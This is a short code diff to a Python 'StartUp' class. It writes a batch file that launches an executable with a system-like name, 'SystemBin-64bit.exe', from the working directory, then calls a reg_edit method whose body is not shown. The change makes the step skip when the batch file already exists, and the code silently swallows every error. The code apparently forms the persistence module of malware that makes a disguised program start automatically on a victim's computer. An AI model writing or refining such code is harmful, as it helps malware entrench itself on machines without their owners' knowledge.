@@ -6,10 +6,13 @@ class StartUp:
     def run(self):
         try:
             self.dir = os.getcwd()
-            with open(f"{self.dir}/run.bat", "w") as f:
-                f.write("@echo off")
-                f.write(f'\nstart "" "{self.dir}\SystemBin-64bit.exe"')
-            self.reg_edit()
+            if not os.path.isfile("run.bat"):
+                with open(f"{self.dir}/run.bat", "w") as f:
+                    f.write("@echo off")
+                    f.write(f'\nstart "" "{self.dir}\SystemBin-64bit.exe"')
+                self.reg_edit()
+            else:
+                return
         except:
             return
             
